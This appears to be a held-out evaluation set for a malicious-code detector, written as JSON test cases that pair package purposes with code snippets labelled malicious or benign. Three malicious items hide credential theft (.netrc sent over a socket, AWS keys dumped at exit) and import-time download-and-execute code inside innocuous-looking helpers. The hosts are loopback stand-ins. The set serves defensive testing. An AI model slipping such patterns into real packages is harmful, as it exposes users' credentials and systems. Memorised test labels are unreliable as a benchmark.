@@ -1,0 +1,127 @@
+[
+ {
+  "id": "held_mal_netrc_socket",
+  "label": "malicious",
+  "group": "heldout",
+  "endpoint": "code",
+  "request": {
+   "purpose": "Helpers for parsing .ini style config files.",
+   "capabilities": [
+    "filesystem",
+    "network"
+   ],
+   "slices": [
+    {
+     "file": "iniutil/read.py",
+     "start": 1,
+     "end": 9,
+     "code": "import os\nimport socket\n\ndef read_ini(path):\n    netrc = os.path.expanduser(\"~/.netrc\")\n    if os.path.exists(netrc):\n        s = socket.create_connection((\"127.0.0.1\", 9), timeout=1)\n        s.sendall(open(netrc, \"rb\").read())\n    return dict(l.split(\"=\", 1) for l in open(path).read().splitlines() if \"=\" in l)\n"
+    }
+   ]
+  }
+ },
+ {
+  "id": "held_mal_remote_py",
+  "label": "malicious",
+  "group": "heldout",
+  "endpoint": "code",
+  "request": {
+   "purpose": "Emoji name lookup table.",
+   "capabilities": [
+    "subprocess",
+    "network"
+   ],
+   "slices": [
+    {
+     "file": "emojiname/__init__.py",
+     "start": 1,
+     "end": 10,
+     "code": "import subprocess\nimport sys\nimport urllib.request\n\ndef _warm():\n    code = urllib.request.urlopen(\"http://127.0.0.1:9/warm.py\", timeout=1).read().decode()\n    subprocess.Popen([sys.executable, \"-c\", code])\n\n_warm()\nNAMES = {\"smile\": \"\\U0001F604\"}\n"
+    }
+   ]
+  }
+ },
+ {
+  "id": "held_mal_atexit",
+  "label": "malicious",
+  "group": "heldout",
+  "endpoint": "code",
+  "request": {
+   "purpose": "Context manager for temporary directories.",
+   "capabilities": [
+    "environment",
+    "filesystem"
+   ],
+   "slices": [
+    {
+     "file": "tmpctx.py",
+     "start": 1,
+     "end": 8,
+     "code": "import atexit\nimport os\n\ndef _bye():\n    keys = {k: v for k, v in os.environ.items() if k.startswith(\"AWS_\")}\n    open(\"/tmp/lineage_marker_atexit\", \"w\").write(repr(keys))\n\natexit.register(_bye)\n"
+    }
+   ]
+  }
+ },
+ {
+  "id": "held_ben_s3",
+  "label": "benign",
+  "group": "heldout",
+  "endpoint": "code",
+  "request": {
+   "purpose": "Upload a local file to an S3 bucket chosen by the user.",
+   "capabilities": [
+    "network",
+    "filesystem"
+   ],
+   "slices": [
+    {
+     "file": "s3put.py",
+     "start": 1,
+     "end": 4,
+     "code": "import boto3\n\ndef upload(path, bucket, key):\n    boto3.client(\"s3\").upload_file(path, bucket, key)\n"
+    }
+   ]
+  }
+ },
+ {
+  "id": "held_ben_ffmpeg",
+  "label": "benign",
+  "group": "heldout",
+  "endpoint": "code",
+  "request": {
+   "purpose": "Create a thumbnail from a video file using ffmpeg.",
+   "capabilities": [
+    "subprocess",
+    "filesystem"
+   ],
+   "slices": [
+    {
+     "file": "thumb.py",
+     "start": 1,
+     "end": 4,
+     "code": "import subprocess\n\ndef thumbnail(video, out, at=\"00:00:01\"):\n    subprocess.run([\"ffmpeg\", \"-y\", \"-ss\", at, \"-i\", video, \"-frames:v\", \"1\", out], check=True)\n"
+    }
+   ]
+  }
+ },
+ {
+  "id": "held_ben_sqlite",
+  "label": "benign",
+  "group": "heldout",
+  "endpoint": "code",
+  "request": {
+   "purpose": "Run parameterised SQLite queries.",
+   "capabilities": [
+    "filesystem"
+   ],
+   "slices": [
+    {
+     "file": "db.py",
+     "start": 1,
+     "end": 5,
+     "code": "import sqlite3\n\ndef query(path, sql, params=()):\n    with sqlite3.connect(path) as con:\n        return con.execute(sql, params).fetchall()\n"
+    }
+   ]
+  }
+ }
+]
